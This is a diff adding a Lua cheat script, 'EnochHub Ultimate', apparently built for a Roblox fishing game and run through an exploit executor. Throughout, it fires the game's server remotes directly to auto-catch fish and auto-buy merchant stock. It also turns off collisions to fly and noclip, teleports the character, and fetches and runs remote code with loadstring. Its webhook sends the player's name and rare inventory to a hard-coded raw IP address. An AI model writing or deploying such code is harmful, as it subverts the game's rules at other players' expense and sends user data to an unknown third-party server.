@@ -1,0 +1,528 @@
+--[[
+    ENOCHHUB ULTIMATE - COMPLETE EDITION
+    - [NEW] Auto 9 Totem Formation (Physics Fly)
+    - [NEW] Merchant Sniper & Auto Buy
+    - Blatant Fishing V5 + Auto Perfection
+    - Safe Teleports & Graphics
+    - Auto Save/Load System
+]]
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local VirtualUser = game:GetService("VirtualUser")
+local LocalPlayer = Players.LocalPlayer
+
+-- ==========================================================
+--  CONFIG & SAVE SYSTEM
+-- ==========================================================
+local FileName = "EnochHub_Full_Config.json"
+
+local Config = {
+    -- Blatant
+    BlatantEnabled = false,
+    AutoEquip = true,
+    CatchDelay = 3.055,
+    LoopInterval = 1.715,
+    CancelDelay = 0.3,
+    
+    -- Utilities
+    AutoSellEnabled = false,
+    AutoFavRubyEnabled = false,
+    AntiAfkEnabled = true,
+    
+    -- Webhook
+    WebhookEnabled = false,
+    WebhookUrl = "http://43.134.116.2:5000/webhook/fishit",
+    WebhookInterval = 30,
+    
+    -- Graphics
+    PotatoModeEnabled = false,
+    PotatoFPS = 60,
+
+    -- Totem & Merchant (New)
+    TotemType = "Luck Totem",
+    MerchantAutoBuy = false
+}
+
+-- Load Settings
+if isfile and isfile(FileName) then
+    pcall(function()
+        local decoded = HttpService:JSONDecode(readfile(FileName))
+        for k, v in pairs(decoded) do Config[k] = v end
+        print("[EnochHub] Settings Loaded.")
+    end)
+end
+
+local function SaveSettings()
+    if writefile then
+        pcall(function() writefile(FileName, HttpService:JSONEncode(Config)) end)
+    end
+end
+
+-- ==========================================================
+--  WIND UI SETUP
+-- ==========================================================
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+local Window = WindUI:CreateWindow({
+    Title = "EnochHub | Ultimate",
+    Icon = "rbxassetid://130348378128532",
+    Author = "EnochHub Standalone",
+    Folder = "EnochHub",
+    Size = UDim2.fromOffset(620, 450),
+    Transparent = true,
+    Theme = "Sky",
+    Resizable = true,
+})
+
+local TabFish = Window:Tab({ Title = "Blatant", Icon = "anchor" })
+local TabTotem = Window:Tab({ Title = "Totem", Icon = "box" }) -- NEW
+local TabMerch = Window:Tab({ Title = "Merchant", Icon = "shopping-cart" }) -- NEW
+local TabTp = Window:Tab({ Title = "Teleport", Icon = "map" })
+local TabUtil = Window:Tab({ Title = "Utilities", Icon = "settings" })
+local TabWeb = Window:Tab({ Title = "Webhook", Icon = "globe" })
+local TabGfx = Window:Tab({ Title = "Graphics", Icon = "monitor" })
+
+_G.EnochHub_BlatantActive = false
+
+-- ==========================================================
+--  DATA & MODULES
+-- ==========================================================
+local Shared = ReplicatedStorage:WaitForChild("Shared")
+local Packages = ReplicatedStorage:WaitForChild("Packages")
+
+local ItemUtility = require(Shared:WaitForChild("ItemUtility"))
+local TierUtility = require(Shared:WaitForChild("TierUtility"))
+local Replion = require(Packages:WaitForChild("Replion")).Client
+
+local function GetRemote(name)
+    local path = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
+    local current = ReplicatedStorage
+    for _, child in ipairs(path) do
+        current = current:WaitForChild(child, 2)
+        if not current then return nil end
+    end
+    return current:FindFirstChild(name)
+end
+
+-- Fishing Remotes
+local RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
+local RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
+local RE_FishingCompleted = GetRemote("RE/FishingCompleted")
+local RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
+local RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
+local RF_SellAllItems = GetRemote("RF/SellAllItems")
+local RE_FavoriteItem = GetRemote("RE/FavoriteItem")
+local RF_UpdateAutoFishingState = GetRemote("RF/UpdateAutoFishingState")
+
+-- Totem/Merchant Remotes
+local RE_SpawnTotem = GetRemote("RE/SpawnTotem")
+local RF_EquipOxygenTank = GetRemote("RF/EquipOxygenTank")
+local RF_UnequipOxygenTank = GetRemote("RF/UnequipOxygenTank")
+local RF_PurchaseMarketItem = GetRemote("RF/PurchaseMarketItem")
+
+-- ==========================================================
+--  [FEATURE 1] AUTO 9 TOTEM LOGIC
+-- ==========================================================
+local AUTO_9_TOTEM_ACTIVE = false
+local AUTO_9_TOTEM_THREAD = nil
+local TotemToggleUI = nil -- Reference to toggle button
+
+local TOTEM_DATA = { ["Luck Totem"] = {Id = 1}, ["Mutation Totem"] = {Id = 2}, ["Shiny Totem"] = {Id = 3} }
+local TOTEM_NAMES = {"Luck Totem", "Mutation Totem", "Shiny Totem"}
+
+local REF_CENTER = Vector3.new(93.932, 9.532, 2684.134)
+local REF_SPOTS = {
+    Vector3.new(45.0468, 9.516, 2730.190), Vector3.new(145.644, 9.516, 2721.907), Vector3.new(84.640, 10.217, 2636.057),
+    Vector3.new(45.0468, 110.516, 2730.190), Vector3.new(145.644, 110.516, 2721.907), Vector3.new(84.640, 111.217, 2636.057),
+    Vector3.new(45.0468, -92.483, 2730.190), Vector3.new(145.644, -92.483, 2721.907), Vector3.new(84.640, -93.782, 2636.057),
+}
+
+local function GetTotemUUID(name)
+    local r = Replion:WaitReplion("Data", 5)
+    if not r then return nil end
+    local success, data = pcall(function() return r:GetExpect("Inventory") end)
+    if success and data.Totems then 
+        for _, item in ipairs(data.Totems) do 
+            if tonumber(item.Id) == TOTEM_DATA[name].Id and (item.Count or 1) >= 1 then return item.UUID end 
+        end 
+    end
+    return nil
+end
+
+-- V3 Physics (Noclip/Fly)
+local stateConnection = nil
+local function EnableV3Physics()
+    local char = LocalPlayer.Character
+    local hum = char and char:FindFirstChild("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root or not hum then return end
+
+    if char:FindFirstChild("Animate") then char.Animate.Disabled = true end
+    hum.PlatformStand = true 
+    
+    hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+    if not stateConnection then
+        stateConnection = RunService.Heartbeat:Connect(function()
+            if hum and AUTO_9_TOTEM_ACTIVE then hum:ChangeState(Enum.HumanoidStateType.Swimming) end
+        end)
+    end
+
+    local bg = root:FindFirstChild("FlyGuiGyro") or Instance.new("BodyGyro", root)
+    bg.Name = "FlyGuiGyro"; bg.P = 9e4; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9); bg.CFrame = root.CFrame
+    local bv = root:FindFirstChild("FlyGuiVelocity") or Instance.new("BodyVelocity", root)
+    bv.Name = "FlyGuiVelocity"; bv.velocity = Vector3.zero; bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+
+    task.spawn(function()
+        while AUTO_9_TOTEM_ACTIVE and char do
+            for _, v in ipairs(char:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
+            task.wait(0.1)
+        end
+    end)
+end
+
+local function DisableV3Physics()
+    local char = LocalPlayer.Character
+    local hum = char and char:FindFirstChild("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    
+    if root then
+        if root:FindFirstChild("FlyGuiGyro") then root.FlyGuiGyro:Destroy() end
+        if root:FindFirstChild("FlyGuiVelocity") then root.FlyGuiVelocity:Destroy() end
+        root.Velocity = Vector3.zero
+    end
+    if hum then hum.PlatformStand = false; hum:ChangeState(Enum.HumanoidStateType.GettingUp) end
+    if stateConnection then stateConnection:Disconnect(); stateConnection = nil end
+    if char and char:FindFirstChild("Animate") then char.Animate.Disabled = false end
+end
+
+local function FlyPhysicsTo(targetPos)
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local bv = root:FindFirstChild("FlyGuiVelocity")
+    local bg = root:FindFirstChild("FlyGuiGyro")
+    if not bv or not bg then EnableV3Physics(); bv = root.FlyGuiVelocity; bg = root.FlyGuiGyro end
+    
+    while AUTO_9_TOTEM_ACTIVE do
+        local dist = (targetPos - root.Position).Magnitude
+        bg.CFrame = CFrame.lookAt(root.Position, targetPos)
+        if dist < 1.5 then bv.velocity = Vector3.zero; break else bv.velocity = (targetPos - root.Position).Unit * 80 end
+        RunService.Heartbeat:Wait()
+    end
+end
+
+local function Run9TotemLoop()
+    if AUTO_9_TOTEM_THREAD then task.cancel(AUTO_9_TOTEM_THREAD) end
+    AUTO_9_TOTEM_THREAD = task.spawn(function()
+        local uuid = GetTotemUUID(Config.TotemType)
+        if not uuid then 
+            WindUI:Notify({ Title = "No Totems", Content = "Buy more " .. Config.TotemType, Icon = "x" })
+            if TotemToggleUI then TotemToggleUI:Set(false) end
+            return 
+        end
+
+        local root = LocalPlayer.Character.HumanoidRootPart
+        local startPos = root.Position
+        if RF_EquipOxygenTank then pcall(function() RF_EquipOxygenTank:InvokeServer(105) end) end
+        EnableV3Physics()
+
+        for i, refSpot in ipairs(REF_SPOTS) do
+            if not AUTO_9_TOTEM_ACTIVE then break end
+            local targetPos = startPos + (refSpot - REF_CENTER)
+            FlyPhysicsTo(targetPos)
+            task.wait(0.6)
+            
+            uuid = GetTotemUUID(Config.TotemType) -- Refresh UUID
+            if uuid then
+                pcall(function() RE_SpawnTotem:FireServer(uuid) end)
+                task.spawn(function() for k=1,5 do RE_EquipToolFromHotbar:FireServer(1) task.wait(0.1) end end)
+                WindUI:Notify({ Title = "Totem", Content = "Placed #"..i, Duration = 1 })
+            else
+                WindUI:Notify({ Title = "Empty", Content = "Out of totems!", Icon = "alert-triangle" })
+                break
+            end
+            task.wait(1.5)
+        end
+
+        if AUTO_9_TOTEM_ACTIVE then FlyPhysicsTo(startPos) end
+        if RF_UnequipOxygenTank then pcall(function() RF_UnequipOxygenTank:InvokeServer() end) end
+        DisableV3Physics()
+        AUTO_9_TOTEM_ACTIVE = false
+        if TotemToggleUI then TotemToggleUI:Set(false) end
+        WindUI:Notify({ Title = "Done", Content = "Formation Complete.", Icon = "check" })
+    end)
+end
+
+-- ==========================================================
+--  [FEATURE 2] MERCHANT LOGIC
+-- ==========================================================
+local MerchantReplion = nil
+local MerchUpdateThread = nil
+local AutoBuyMerchThread = nil
+
+local MerchantStaticItems = {
+    {Name = "Fluorescent Rod", ID = 1, Price = 685000}, {Name = "Hazmat Rod", ID = 2, Price = 1380000},
+    {Name = "Singularity Bait", ID = 3, Price = 8200000}, {Name = "Royal Bait", ID = 4, Price = 425000},
+    {Name = "Luck Totem", ID = 5, Price = 650000}, {Name = "Shiny Totem", ID = 7, Price = 400000},
+    {Name = "Mutation Totem", ID = 8, Price = 800000}
+}
+
+local function FormatNumber(n)
+    if n >= 1e9 then return string.format("%.1fB", n/1e9) elseif n >= 1e6 then return string.format("%.1fM", n/1e6) elseif n >= 1e3 then return string.format("%.1fK", n/1e3) else return tostring(n) end
+end
+
+local function GetMerchantDetails()
+    local r = Replion:WaitReplion("Merchant", 5)
+    if not r then return {} end
+    
+    local itemDetails = {}
+    local MarketItemData = require(ReplicatedStorage.Shared.MarketItemData)
+    
+    if r.Data and r.Data.Items then
+        for _, itemID in ipairs(r.Data.Items) do
+            local mData = nil
+            for _, d in ipairs(MarketItemData) do if d.Id == itemID then mData = d; break end end
+            if mData then
+                local name = mData.Identifier or "Unknown"
+                if ItemUtility then
+                    pcall(function() 
+                        local d = ItemUtility:GetItemDataFromItemType(mData.Type, mData.Identifier) 
+                        if d and d.Data then name = d.Data.Name end
+                    end)
+                end
+                table.insert(itemDetails, {Name = name, ID = itemID, Price = mData.Price})
+            end
+        end
+    end
+    return itemDetails
+end
+
+local function BuyMerchantItem(id, name)
+    local s = pcall(function() RF_PurchaseMarketItem:InvokeServer(id) end)
+    if s then WindUI:Notify({Title="Bought", Content=name, Icon="check"}) end
+end
+
+local function RunAutoBuyMerch()
+    if AutoBuyMerchThread then task.cancel(AutoBuyMerchThread) end
+    AutoBuyMerchThread = task.spawn(function()
+        while Config.MerchantAutoBuy do
+            local items = GetMerchantDetails()
+            for _, item in ipairs(items) do
+                BuyMerchantItem(item.ID, item.Name)
+                task.wait(0.5)
+            end
+            task.wait(2)
+        end
+    end)
+end
+
+-- ==========================================================
+--  EXISTING HELPERS (WEBHOOK, BLATANT, ETC)
+-- ==========================================================
+local function GetFishNameAndRarity(item)
+    local name = item.Identifier or "Unknown"
+    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+    if ItemUtility and item.Id then
+        pcall(function()
+            local d = ItemUtility:GetItemData(item.Id)
+            if not d then d = ItemUtility:GetItemData(tonumber(item.Id)) end
+            if d and d.Data then name = d.Data.Name end
+        end)
+    end
+    if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity end
+    return name, rarity
+end
+
+local function SendWebhookData(summary)
+    if Config.WebhookUrl == "" then return end
+    local json = HttpService:JSONEncode(summary)
+    local encoded = HttpService:UrlEncode(json)
+    local url = Config.WebhookUrl .. "?player=" .. HttpService:UrlEncode(LocalPlayer.Name) .. "&data=" .. encoded
+    pcall(function() game:HttpGet(url) end)
+end
+
+local function ToggleWebhook(state)
+    Config.WebhookEnabled = state; SaveSettings()
+    if state then
+        task.spawn(function()
+            while Config.WebhookEnabled do
+                local r = Replion:WaitReplion("Data", 5)
+                if r then
+                    local s, data = pcall(function() return r:GetExpect("Inventory") end)
+                    if s and data then
+                        local summary = {}; local total = 0
+                        local function scan(list)
+                            for _, item in ipairs(list) do
+                                local n, r = GetFishNameAndRarity(item)
+                                if r == "SECRET" then summary[n] = (summary[n] or 0)+1; total = total+1 end
+                            end
+                        end
+                        if data.Items then scan(data.Items) else for _, c in pairs(data) do if type(c)=="table" then scan(c) end end end
+                        if total > 0 then SendWebhookData(summary) end
+                    end
+                end
+                task.wait(Config.WebhookInterval)
+            end
+        end)
+    end
+end
+
+-- ==========================================================
+--  BLATANT CORE
+-- ==========================================================
+local BlatantThread = nil
+local EquipThread = nil
+
+local function ToggleBlatant(state)
+    _G.EnochHub_BlatantActive = state
+    Config.BlatantEnabled = state
+    SaveSettings()
+    
+    if state then
+        if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(true) end) end
+        BlatantThread = task.spawn(function()
+            while Config.BlatantEnabled do
+                task.spawn(function()
+                    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        local start = os.clock()
+                        pcall(function() RF_ChargeFishingRod:InvokeServer(os.time() + os.clock()) end)
+                        pcall(function() RF_RequestFishingMinigameStarted:InvokeServer(root.Position.X, root.Position.Z) end)
+                        local w = Config.CatchDelay - (os.clock() - start)
+                        if w > 0 then task.wait(w) end
+                        pcall(function() RE_FishingCompleted:FireServer() end)
+                        task.wait(Config.CancelDelay)
+                        pcall(function() RF_CancelFishingInputs:InvokeServer() end)
+                    end
+                end)
+                task.wait(Config.LoopInterval)
+            end
+        end)
+        EquipThread = task.spawn(function()
+            while Config.BlatantEnabled do
+                if Config.AutoEquip and RE_EquipToolFromHotbar then pcall(function() RE_EquipToolFromHotbar:FireServer(1) end) end
+                task.wait(0.5)
+            end
+        end)
+        WindUI:Notify({ Title = "Blatant", Content = "Enabled.", Icon = "check" })
+    else
+        if BlatantThread then task.cancel(BlatantThread) end
+        if EquipThread then task.cancel(EquipThread) end
+        if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
+        pcall(function() RE_EquipToolFromHotbar:FireServer(0) end)
+        WindUI:Notify({ Title = "Blatant", Content = "Disabled.", Icon = "x" })
+    end
+end
+
+-- ==========================================================
+--  UI BUILDING
+-- ==========================================================
+
+-- 1. BLATANT TAB
+local SectFish = TabFish:Section({ Title = "Fishing", TextSize = 17 })
+SectFish:Toggle({ Title = "Enable Blatant", Value = Config.BlatantEnabled, Callback = ToggleBlatant })
+SectFish:Toggle({ Title = "Auto Equip", Value = Config.AutoEquip, Callback = function(v) Config.AutoEquip = v SaveSettings() end })
+SectFish:Slider({ Title = "Catch Delay", Min = 0.05, Max = 5, Default = Config.CatchDelay, Precision = 3, Callback = function(v) Config.CatchDelay = v SaveSettings() end })
+SectFish:Slider({ Title = "Loop Interval", Min = 1, Max = 5, Default = Config.LoopInterval, Precision = 3, Callback = function(v) Config.LoopInterval = v SaveSettings() end })
+
+-- 2. TOTEM TAB
+local SectTotem = TabTotem:Section({ Title = "9 Totem Formation", TextSize = 17 })
+SectTotem:Dropdown({ 
+    Title = "Totem Type", Values = TOTEM_NAMES, Value = Config.TotemType, 
+    Callback = function(v) Config.TotemType = v; SaveSettings() end 
+})
+TotemToggleUI = SectTotem:Toggle({
+    Title = "Start Formation", Desc = "Flies to 9 spots and places totems.", Value = false,
+    Callback = function(state)
+        AUTO_9_TOTEM_ACTIVE = state
+        if state then Run9TotemLoop() else 
+            if AUTO_9_TOTEM_THREAD then task.cancel(AUTO_9_TOTEM_THREAD) end
+            DisableV3Physics()
+        end
+    end
+})
+
+-- 3. MERCHANT TAB
+local SectMerch = TabMerch:Section({ Title = "Merchant Control", TextSize = 17 })
+local MerchDisplay = SectMerch:Paragraph({ Title = "Status", Desc = "Turn on Sync to see stock." })
+
+SectMerch:Toggle({
+    Title = "Sync Stock", Desc = "Updates list below.", Value = false,
+    Callback = function(state)
+        if state then
+            MerchUpdateThread = task.spawn(function()
+                while true do
+                    local items = GetMerchantDetails()
+                    local str = "--- STOCK ---"
+                    if #items == 0 then str = str .. "\n(Out of Stock)" else
+                        for _, i in ipairs(items) do str = str .. "\n" .. i.Name .. " (" .. FormatNumber(i.Price) .. ")" end
+                    end
+                    MerchDisplay:SetDesc(str)
+                    task.wait(1)
+                end
+            end)
+        else
+            if MerchUpdateThread then task.cancel(MerchUpdateThread) end
+            MerchDisplay:SetDesc("Sync Off")
+        end
+    end
+})
+
+SectMerch:Toggle({
+    Title = "Auto Buy All", Desc = "Buys everything in stock.", Value = Config.MerchantAutoBuy,
+    Callback = function(state)
+        Config.MerchantAutoBuy = state; SaveSettings()
+        if state then RunAutoBuyMerch() else if AutoBuyMerchThread then task.cancel(AutoBuyMerchThread) end end
+    end
+})
+
+SectMerch:Button({
+    Title = "Teleport to Merchant",
+    Callback = function()
+        local pos = Vector3.new(-127.7, 2.7, 2759.0)
+        if LocalPlayer.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos) end
+    end
+})
+
+-- 4. TELEPORT TAB
+local SectTp = TabTp:Section({ Title = "Locations", TextSize = 17 })
+local Coords = {
+    ["Ancient Jungle"] = Vector3.new(1535.6, 3.2, -193.3), ["Ancient Ruin"] = Vector3.new(6032.0, -585.9, 4713.1),
+    ["Classic Island"] = Vector3.new(1440.8, 46.0, 2777.2), ["Coral Reef"] = Vector3.new(-3207.5, 6.0, 2011.0),
+    ["Iron Cavern"] = Vector3.new(-8792.5, -588.0, 230.6), ["Volcano"] = Vector3.new(-605.1, 19.5, 160.0),
+    -- Add more as needed
+}
+local AreaList = {} for n in pairs(Coords) do table.insert(AreaList, n) end table.sort(AreaList)
+
+SectTp:Dropdown({
+    Title = "Teleport", Values = AreaList,
+    Callback = function(n)
+        local p = Coords[n]
+        if p and LocalPlayer.Character then
+            if RE_EquipToolFromHotbar then pcall(function() RE_EquipToolFromHotbar:FireServer(0) end) end
+            task.wait(0.3)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p) * CFrame.new(0,3,0)
+        end
+    end
+})
+
+-- 5. WEBHOOK & UTIL
+local SectWeb = TabWeb:Section({ Title = "Scanner", TextSize = 17 })
+SectWeb:Toggle({ Title = "Enable", Value = Config.WebhookEnabled, Callback = ToggleWebhook })
+SectWeb:Input({ Title = "URL", Default = Config.WebhookUrl, Callback = function(v) Config.WebhookUrl = v SaveSettings() end })
+
+local SectUtil = TabUtil:Section({ Title = "Auto", TextSize = 17 })
+SectUtil:Toggle({ Title = "Auto Sell", Value = Config.AutoSellEnabled, Callback = function(v) Config.AutoSellEnabled = v; SaveSettings() end })
+SectUtil:Toggle({ Title = "Anti-AFK", Value = Config.AntiAfkEnabled, Callback = function(v) Config.AntiAfkEnabled = v; SaveSettings() end })
+
+-- Init
+if Config.BlatantEnabled then ToggleBlatant(true) end
+if Config.WebhookEnabled then ToggleWebhook(true) end
+if Config.MerchantAutoBuy then RunAutoBuyMerch() end
+
+WindUI:Notify({ Title = "EnochHub", Content = "Ultimate Loaded.", Duration = 4, Icon = "check" })
